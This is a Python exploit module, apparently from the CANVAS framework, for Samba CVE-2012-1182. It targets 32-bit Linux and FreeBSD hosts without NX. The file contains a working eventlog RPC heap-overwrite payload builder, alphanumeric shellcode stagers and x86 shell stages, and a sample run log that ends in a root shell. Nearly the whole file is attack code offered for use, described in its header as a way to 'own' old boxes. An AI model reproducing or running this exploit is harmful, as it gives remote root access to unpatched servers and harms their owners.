# CVE-2012-1182-NONX: SAMBA 3.4.x remote root exploit

# This is a version of the CVE-2012-1182 attack that will work targetless against 32bit systems that do not support NX
# you can use this to own old linux and fbsd boxen in a single targetless attempt.

VERSION = '0.1'
NAME = 'CVE-2012-1182-NONX'
DESCRIPTION = 'CVE-2012-1182-NONX: SAMBA 3.4.X/3.5.x/3.6.x Remote Root'

DOCUMENTATION = {}
DOCUMENTATION['VENDOR'] = 'Samba'
DOCUMENTATION['Date public'] = '04/10/2012'
DOCUMENTATION['CVE Name'] = 'CVE-2012-1182'
DOCUMENTATION['CVE Url'] = 'N/A'
DOCUMENTATION['CVSS'] = 0.0
DOCUMENTATION['References'] = 'http://www.samba.org'
DOCUMENTATION['Repeatability'] = 'Repeatable'

PROPERTY = {}
PROPERTY['TYPE'] = 'Exploit'
PROPERTY['SITE'] = 'Remote'
PROPERTY['ARCH'] = [['Linux']]

NOTES = """
Example against FreeBSD 8 (i386) with Samba 3.5.4

[bas@dev canvas]$ python ./exploits/CVE_2012_1182_NONX/CVE_2012_1182_NONX.py -v1 -t192.168.36.134
...
Generating payload based on self.code ...
\x89\xde\x56\x50\x89\xe7\x33\xc0\x50\x6a\x04\x57\x56\x89\xe1\x33\xdb\xb3\x0a\xb0\x66\xcd\x80\x83\xc4\x10\x59\x5e\x56\x51\x33\xc0\x50\x6a\xff\x6a\x22\x6a\x07\x51\x50\x89\xe3\xb0\x5a\xcd\x80\x83\xc4\x18\x89\xc7\x59\x5e\x56\x57\x51\x57\x56\x51\x57\x33\xc0\x59\x5a\x52\x51\x89\xf3\xb0\x03\xcd\x80\x85\xc0\x7e\x11\x5f\x59\x5e\x01\xc7\x29\xc1\x85\xc9\x75\xe2\x5f\x57\x89\xf3\xff\xd7\x33\xc0\x40\xcd\x80[ Fri Apr 13 15:12:59 2012 ] [C] (192.168.36.134/32) ### Computer Hacking: 192.168.36.134
### Aligning data on: 4
### Aligning data on: 4
[ Fri Apr 13 15:12:59 2012 ] [C] (192.168.36.134/32) ### Succesfully Hacked Computer!
[ Fri Apr 13 15:12:59 2012 ] [C] (192.168.36.134/32) ### Staging to stage1 payload, version: FreeBSD X86, no NX,
stages to: shell
[C] Creating shelllistener, done!
[C] Module succeeded!
simpleShell$ c id

uid=0(root) gid=0(wheel) egid=65534(nobody) groups=65534(nobody)
0

simpleShell$ c /usr/local/sbin/smbd -V
Version 3.4.5
0

simpleShell$ 


"""

import sys
import struct
import time

if '.' not in sys.path:
    sys.path.append('.')

from libs.ctelnetlib import Telnet
from libs.newsmb import libdcerpc
from MOSDEF import mosdef
from linuxNode import linuxNode
from MOSDEFShellServer import MosdefShellServer
from exploitutils import *
from tcpexploit import tcpexploit

import unixShellNode
from shelllistener import *
import shellcodeGenerator

class XError(Exception):    
    def __init__(self, v):
        self.v = v

    def __str__(self):
        return repr(self.v)

ALPHANUM_FBSD_X86_PAYLOADS = {
    'debug' : 'VZAAAAAAAAAhAAAAPPPPPPPPPPPPTYkA020B0h8A0uXB9B0uHABBBBhFKAAPPPPPPPPPPPPTYkA020B0ABjAX8A0uCj',
    'fnsck' : 'VZAAAAAAAAAhAAAAPPPPPPPPPPPPTYkA020B0h8A0uXB9B0uHABBBBhAIIIhAAAAhBAAAhDCFAhCEABhADCChECFAhDCCChCBABhDCEAhAAAAhDBGAhECCChEADEhAADChECFAhDCCChCBABhCDEAhAACDhACDChCFAChCCBAhACBDhCCCBhAEABhBDCFhCCEAhBAHDhEECChDCEHhCDAAhDAADhEACAhAACChDCFAhCHCBhABDChCCCBhAEAChGDDBhFEFCPPPPPPPPPPPPTYkA020B0ABjIX8A0uCIepgHLmWIrFFFFmTTXFBFGTWFa27rcOIip9V2MJbM2MBc0x03XNmQzLEGIrTLFa2IrTVFGmQFTIFETcFa2p9UNp3RVHbSIrFmQTLFEG2Fa22JLcr3s03XNbNm2P8Y0YWIIrFmQTLFEG2Fa29KFAGIrTKFa2myMUZnMMM'
}

FBSD_X86_STAGES = {
    'debug' : '\xcc',
    'shell' : '\x33\xc0\x50\x50\xb0\x17\x50\xcd\x80\x33\xc9\xb1\x03\x33\xd2\x52\x53\x33\xc0\xb0\x5a\x50\xcd\x80\x42\xe2\xf4\x33\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\x50\x51\x53\xb0\x3b\x50\xcd\x80'
}

ALPHANUM_LINUX_X86_PAYLOADS = {
    'debug' : 'VZAAAAAAAAAhAAAAPPPPPPPPPPPPTYkA020B0h8A0uXB9B0uHABBBBhFKAAPPPPPPPPPPPPTYkA020B0ABjAX8A0uCj',
    'fnsck' : 'VZAAAAAAAAAhAAAAPPPPPPPPPPPPTYkA020B0h8A0uXB9B0uHABBBBhIIIIhBAAAhCFAAhEAEAhCCAAhDCAAhDDADhDDAChAAAChBDFAhAADChCEABhADAEhAADChAAAChBDFAhBDBAhEAEBhCCBAhBFAChCBABhFCBDhAEAEhAACEhAFFAhAAABhCDAKhEECChCADDhAECChCFAAhDBABhCEABhBDCChCBAChCCEAhCAAChDDCDhCCAAhFDCDhCEAAhACCDhEACAhCDEFhACEBhCCEAhBFAAhAEABhCHDBhBHEAhBCDEhCGDDhAAEAhDADAhCAAAhADDFhAADAhAFCDhDACDhCBDChAEBBhDEAEhBCDAhADCFhABAAhDBCFhAEABhEBAEhDCCAhBACBhEECChAEFHhABAEhDBAAhAADChADCDhAADAhEBAFhDBCAhCEABhBCDChDBCDhABABhBDCAhDDEFhDAADhADDDhAEEAhCBAEhCGDDhCCAAhAEFBhDFAEhBDCBhEAEAhCAEFhFAAAhBDBEhAAAAhACAAhDBEFhFEBBhEEAEhDDDDhFEAGPPPPPPPPPPPPTYkA020B0ABjIX8A0uCIieHLHH1IrIeI6UKTMa23MEMM5pULTMa27icPIeIiIrWEWTxa2IrIeU6FPOpgHLGmTIi1IrMFsVG62HHHIeUMFPOmUTXmQXiYXGAIiWOTpMLmSa29O2JBbA2JJbLmFYpmFIrIex03XNmSFTLFGMLmSIrIiWATpa2mF2JLc7ihL9FIrIiI6T6VLUqskX7ebMsQIPEAWEaMMMasIeYTIipeHLiXLI6FIDDzLmUIrTja29b2r7rb3ipLIeIiI2I6cKIIisCIdCWp3KHLbdUYZBEGIrFmPFTLFDGIiWBmSTpa21vnOMJ9Ju03XNbDYj1t2mFEALMMGIrIiIeEWJEmQTFa2NNOmyIrI6VLmSTKa22NMbk9t2YaMN2IrmH9D2TKa22NMbGqJbOauIL2YWHHMTIiIrVa2Z6MMM'
}

LINUX_X86_STAGES = {
    'debug' : '\xcc',
    'shell' : '\x33\xc9\x33\xc0\xb0\x3f\xcd\x80\x41\x80\xf9\x03\x75\xf4\x33\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\x33\xd2\xb0\x0b\xcd\x80',
    'mosdef' : '\x89\xde\x56\x50\x89\xe7\x33\xc0\x50\x6a\x04\x57\x56\x89\xe1\x33\xdb\xb3\x0a\xb0\x66\xcd\x80\x83\xc4\x10\x59\x5e\x56\x51\x33\xc0\x50\x6a\xff\x6a\x21\x6a\x07\x51\x50\x89\xe3\xb0\x5a\xcd\x80\x83\xc4\x18\x89\xc7\x59\x5e\x56\x57\x51\x57\x56\x51\x57\x33\xc0\x59\x5a\x52\x51\x89\xf3\xb0\x03\xcd\x80\x85\xc0\x7e\x11\x5f\x59\x5e\x01\xc7\x29\xc1\x85\xc9\x75\xe2\x5f\x57\x89\xf3\xff\xd7\x33\xc0\x40\xcd\x80'
}

VERSIONS = {
    0 : ['Linux X86, no NX, stages to: shell', ALPHANUM_LINUX_X86_PAYLOADS['fnsck'], LINUX_X86_STAGES['shell'], 'shell'],
    1 : ['FreeBSD X86, no NX, stages to: shell', ALPHANUM_FBSD_X86_PAYLOADS['fnsck'], FBSD_X86_STAGES['shell'], 'shell'],
    2 : ['Linux X86, no NX, stages to: mosdef', ALPHANUM_LINUX_X86_PAYLOADS['fnsck'], LINUX_X86_STAGES['mosdef'], 'mosdef']
}

class Samba:
    def __init__(self, host, privacy=False, payload='', frag_level=None):
        self.dce = libdcerpc.DCERPC(u'ncacn_np:%s[\\eventlog]' % host)
        self.dce.max_dcefrag = 100
        if privacy == False:
            if not self.dce.bind(u'82273fdc-e32a-18c3-3f78-827929dc23ea', u'0.0'):
                raise XError, 'Could not bind to EVENTLOG ...'
        else:
            # use packet privact ... go toad
            if not self.dce.bind(u'82273fdc-e32a-18c3-3f78-827929dc23ea', u'0.0',
                libdcerpc.RPC_C_AUTHN_WINNT, libdcerpc.RPC_C_AUTHN_LEVEL_PKT_PRIVACY):
                raise XError, 'Could not bind to EVENTLOG ...'
        self.payload = payload

    # >>> '\x01\x00'.decode('utf-16le').encode('utf-8')
    def x_convert_to_utf16_le(self, data):
        ret = ''
        for c in data:
            if (ord(c) >= 0x00 and ord(c) <= 0x7f) or ord(c) == 0xff:
                ret += c + '\x00'
            else:
                raise XError, 'Your Computer Hack Payload sux ...'
        return ret

    def x_align(self, data, align):
        if len(data) % align:
            print '### Aligning data on: %d' % align
            return data + 'P' * (align - (len(data) % align))
        else:
            return data

    # xref with ndr_push_eventlog_ReportEventW ...
    def ndr_push_eventlog_reportevent(self):
        EVENTLOG_INFORMATION_TYPE = 4

        hax_of_strings = 16 # alloc control
        num_of_strings = 24 # overwrite control ... leave flags alone ...
        write_offsets = [21] # offset to talloc destructor, null everything else to prevent talloc_abort()
        
        # seed our unique ptr ...
        unique_ptr = 0xdeadc0de

        # handle: struct policy handle
        data  = struct.pack('<L', 0x41424344) # handle_type
        data += 'A' * 16 # GUID
        
        # timestamp
        data  = self.x_align(data, 4)
        data += struct.pack('<L', 0xcafebabe)
        
        # event_type
        data  = self.x_align(data, 2)
        data += struct.pack('<H', EVENTLOG_INFORMATION_TYPE)
        
        # event_category
        data  = self.x_align(data, 2)
        data += struct.pack('<H', 0)
        
        # event_id
        data  = self.x_align(data, 4)
        data += struct.pack('<L', 0)
        
        # num_of_strings ... this controls array overwrite
        data  = self.x_align(data, 2)
        data += struct.pack('<H', num_of_strings) # can't be > 256
        
        # data_size
        data  = self.x_align(data, 4)
        data += struct.pack('<L', 0)
        
        # servername: struct lsa_String
        data  = self.x_align(data, 4)
        data += struct.pack('<H', 0) # length
        data += struct.pack('<H', 0) # size
        data += struct.pack('<L', 0) # generic_ptr null
        
        # user_sid
        data  = self.x_align(data, 4)
        data += struct.pack('<L', 0) # generic_ptr null
        
        # struct lsa_string **strings
        data  = self.x_align(data, 4)
        data += struct.pack('<L', unique_ptr); unique_ptr += 1 # generic_ptr 1
       
        # array_size ... this controls array alloc
        data  = self.x_align(data, 4)
        data += struct.pack('<L', hax_of_strings)
        
        # write null pointers up to write offset
        for i in range(0, num_of_strings):

            # write a NULL into this index ...
            if i not in write_offsets:
                # pull aligns on 4 ...
                data  = self.x_align(data, 4)
                data += struct.pack('<L', 0) # generic_ptr null

            # write a ptr to controlled data to this index ...
            else:
                # pull aligns on 4 ...
                data = self.x_align(data, 4)
           
                # On entry of payload-prepend the last value popped off the stack was
                # was the return address to payload ... so we can load our base ref
                # from there :)

                payload_pp  = "\x58" # pop eax .. so we dont tread on the pointer we want
                payload_pp += "\x24\x00" # and 0x00,al, clear carry flag ... using sbb
                payload_pp += "\x54" # push esp
                payload_pp += "\x58" # pop saved esp into eax for sbb
                payload_pp += "\x1d\x08\x00\x00\x00" # sbb 8 from eax
                payload_pp += "\x50" # push eax
                payload_pp += "\x5c" # pop esp, esp now points at return address to payload
                payload_pp += "\x6a\x16" # push offset from base to base of alphanum payload
                payload_pp += "\x59" # pop ecx
                payload_pp += "\x01\x0c\x24" # add ecx,(esp)
                payload_pp += "\x5e" # pop esi ... esi now points to alphanumeric payload base
                payload_pp += "\x56" # push esi
                payload_pp += "\xff" # \xff\x00 turns into \xc3\xbf ... giving us a ret
                # esi now points at base of alphanumeric payload (pre-req for our decoder to work)
                charset = self.x_convert_to_utf16_le(payload_pp + self.payload)
                if len(charset) % 2:
                    raise XError, '### Payload not aligned on 2 ...'

                data += struct.pack('<L', unique_ptr); unique_ptr += 1 # generic_ptr 1
            
                # UPDATE:
                # To get away from call 4(%reg) dependence we note the following:
                # stack layout is: bla, ptr->[0xsize,0xlen,ptr_to_payload]
                # we can treat the 2nd ptr as a stackframe and pop ebp from it, to
                # to then just leave/ret into our ptr_to_payload ...
                    
                # NOTE: even cuter would've been to use the 4 prefix bytes of len and size
                # to go directly to ptr_to_payload, but seems impossible with x86 using 4 prefix bytes
                # and no controlled suffix bytes (random padding crap behind pointer)

                data += struct.pack('<H', 0x5d5d) # size ... use for: pop ebp, pop ebp
                data += struct.pack('<H', 0xc3c9) # len ... use for: leave, ret
                data += struct.pack('<L', unique_ptr); unique_ptr += 1 # generic_ptr 1
                
                # widechar array .... the checks on these array length/sizes will error out and trigger win on talloc destruction
                data += struct.pack('<L', len(charset)/2) # array size
                data += struct.pack('<L', 0) # array offset
                data += struct.pack('<L', len(charset)/2) # array length
                data += charset

        # data
        data  = self.x_align(data, 4)
        data += struct.pack('<L', 0) # generic_ptr null
        
        # flags
        data  = self.x_align(data, 2)
        data += struct.pack('<H', 0)
        
        # record_number
        data  = self.x_align(data, 4)
        data += struct.pack('<L', 0) # generic_ptr null
        
        # time_written
        data  = self.x_align(data, 4)
        data += struct.pack('<L', 0) # generic_ptr null

        # go go go
        self.dce.call(11, data, response = False)

        # check for payload trigger in response data ...
        return (self.dce.dcerpc_connection.s, self.dce.dcerpc_connection.s.recv(0x1000))

class theexploit(tcpexploit):
    def __init__(self):
        tcpexploit.__init__(self)
        self.version    = 0
        self.host       = ''
        self.port       = 445
        self.debug      = False
        self.privacy    = False
        self.frag_level = None

    def createShellcode(self):
        sc = shellcodeGenerator.linux_X86()
        sc.addAttr('read_and_exec', { 'fdreg' : 'ebx' })
        sc = sc.get()

    def displayVersions(self):
        i = 0
        for v in VERSIONS:
            print '%d - %s' % (v, VERSIONS[v][0])

    def get_args(self):
        self.getarg("port")

    def run(self):
        self.get_args()
        self.host = self.target.interface

        if self.version not in VERSIONS:
            self.log('### Error: no such version')
            return None

        desc, stage0, stage1, shell_type = VERSIONS[self.version]

        self.log('Attacking %s:%s using: %s' % (self.host, self.port, desc))

        if self.covertness >= 2:
            self.log("DCERPC crypto enabled, set covertness to 1 and try again if exploit fails!")
            self.privacy = True

        if self.covertness >= 5 and self.covertness < 11:
            self.log('Crypto + moderate SMB fragmentation')
            self.frag_level = 1
        elif self.covertness == 11:
            self.log('Crypto + MAX fragmentation (VERY SLOW)')
            self.frag_level = 2
        
        try:
            x = Samba(self.host, privacy=self.privacy, payload=stage0, frag_level=self.frag_level)
            
            if self.debug == True:
                self.log('### Attach ...'); sys.stdin.read(1)

            self.log('### Computer Hacking: %s' % self.host)
            s, resp = x.ndr_push_eventlog_reportevent()

            if 'JINX' in resp:
                self.log('### Succesfully Hacked Computer!')
                self.log('### Staging to stage1 payload, version: %s' % desc)
                
                s.send('JINX')
                s.send(struct.pack('<L', len(stage1)) + stage1)
          
                if shell_type == 'shell':        
                    tn = Telnet()
                    tn.sock = s

                    node = unixShellNode.unixShellNode()
                    node.parentnode = self.argsDict['passednodes'][0]
                    node.shell = shelllistener(shellfromtelnet(tn), simpleShell=1)

                    return node

                if shell_type == 'mosdef':
                    node = linuxNode()
                    node.parentnode = self.argsDict['passednodes'][0]
                    shellServer = MosdefShellServer('Linux', 'i386')
                    shellServer(s, node)
                    node.startup()

                    return node

            else:
                self.log('### Failed ... version < 3.4.x or NX enabled ?')

        except XError, e:
            self.log('### Fatal Exploit Error: %s' % e)

        except Exception:
            self.log('### Fatal General Error ...')
            import traceback
            traceback.print_exc(file=sys.stderr)

if __name__ == '__main__':
    app = theexploit()
    ret = standard_callback_commandline(app)
    
    if hasattr(ret, 'interact') == True:
        ret.interact()
